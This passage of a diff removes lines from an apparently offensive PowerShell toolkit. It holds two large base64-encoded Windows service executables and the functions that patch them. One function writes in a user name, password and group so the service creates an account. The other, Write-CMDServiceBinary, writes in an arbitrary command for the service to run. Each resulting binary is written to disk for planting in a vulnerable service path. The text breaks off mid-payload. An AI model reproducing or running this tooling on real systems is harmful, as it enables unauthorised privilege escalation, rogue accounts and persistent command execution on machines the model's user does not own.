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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAADwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-    [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)
-
-    # get the unicode byte conversions of all arguments
-    $Enc = [System.Text.Encoding]::Unicode
-    $ServiceNameBytes = $Enc.GetBytes($ServiceName)
-    $UserNameBytes = $Enc.GetBytes($UserName)
-    $PasswordBytes = $Enc.GetBytes($Password)
-    $GroupNameBytes = $Enc.GetBytes($GroupName)
-
-    # patch all values in to their appropriate locations
-    for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
-        # service name offset = 2626
-        $Binary[$i+2626] = $ServiceNameBytes[$i]
-    }
-    for ($i=0; $i -lt ($UserNameBytes.Length); $i++) { 
-        # user name offset = 2695
-        $Binary[$i+2696] = $UserNameBytes[$i]
-    }
-    for ($i=0; $i -lt ($PasswordBytes.Length); $i++) { 
-        # password offset = 2765
-        $Binary[$i+2766] = $PasswordBytes[$i]
-    }
-    for ($i=0; $i -lt ($GroupNameBytes.Length); $i++) { 
-        # group name offset = 2735
-        $Binary[$i+2836] = $GroupNameBytes[$i]
-    }
-
-    try {
-        # write the binary array out to the specified path
-        Set-Content -Value $Binary -Encoding Byte -Path $Path
-        "[*] Binary for service '$ServiceName' to create user '$UserName : $Password' written to '$Path'"
-    }
-    catch {
-        Write-Warning "Error while writing to location '$Path': $_"
-        $False
-    }
-}
-
-
-function Write-CMDServiceBinary {
-<#
-    .SYNOPSIS
-
-        This function takes a precompiled C# service executable and binary
-        patches in a custom shell command. It then writes the binary out 
-        to the specified location.
-        
-    .PARAMETER ServiceName
-
-        The service name the EXE will be running under. Required.
-
-    .PARAMETER Path
-
-        Path to write the binary out to. Defaults to the local directory.
-
-    .PARAMETER CMD
-
-        The command to execute.
-
-    .EXAMPLE
-
-        PS C:\> Write-UserAddServiceBinary -ServiceName VulnSVC
-
-        Writes the service binary for VulnSVC to the local directory.
-#>
-
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [Parameter(Mandatory = $True)]
-        [string]
-        $CMD,
-
-        [string]
-        $Path = "service.exe"
-    )
-
-    # the raw unpatched service binary
-    $B64Binary = "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UmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAElEaXNwb3NhYmxlAENvbnRhaW5lcgBTdHJpbmcAVHJpbQBzZXRfU2VydmljZU5hbWUAUHJvY2VzcwBTdGFydABTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABTbGVlcABFbnZpcm9ubWVudABFeGl0AFJ1bgAARUEAQQBBACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAL/3LwBDACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAg